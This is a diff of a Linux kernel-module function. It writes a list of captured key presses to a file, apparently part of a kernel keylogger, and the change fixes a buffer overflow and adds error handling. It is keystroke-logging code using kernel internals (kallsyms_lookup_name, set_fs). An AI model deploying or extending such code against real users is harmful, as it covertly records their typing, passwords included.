@@ -6,29 +6,44 @@ void write_file(struct file *filp)
 {
 	char			*output;
 	struct s_stroke		*st = NULL;
-	unsigned long long offset = 0;
+	unsigned long long off = 0;
 	mm_segment_t oldfs;
 	int ret;
+	int len;
 
 	vfs_write_type	vfs_write =
 		(void *)kallsyms_lookup_name("vfs_write");
 
 	oldfs = get_fs();
 	set_fs(get_ds());
-	output = kmalloc(BUF_SIZE, GFP_KERNEL);
+	output = kmalloc(PAGE_SIZE, GFP_KERNEL);
 	if (output) {
 		memset(output, 0, PAGE_SIZE);
 		list_for_each_entry_reverse(st, &head_stroke_lst, stroke_lst) {
 			if (st->state == PRESSED && st->value != -1 &&
 			    (isprint(st->value) || st->value == 13)) {
-				if (st->value == 13)
-					output[strlen(output)] = '\n';
-				else
-					output[strlen(output)] = st->value;
+				len = strlen(output);
+				if (len < PAGE_SIZE) {
+					if (st->value == 13)
+						output[len] = '\n';
+					else
+						output[len] = st->value;
+				}
+				if (len == PAGE_SIZE - 1) {
+					ret = vfs_write(filp, output,
+							strlen(output), &off);
+					if (ret < 0) {
+						pr_err("vfs_write");
+					}
+					memset(output, 0, PAGE_SIZE);
+				}
 			}
 			kfree(st);
 		}
-		ret = vfs_write(filp, output, strlen(output), &offset);
+		ret = vfs_write(filp, output, strlen(output), &off);
+		if (ret < 0) {
+			pr_err("vfs_write");
+		}
 	}
 	set_fs(oldfs);
 	filp_close(filp, NULL);
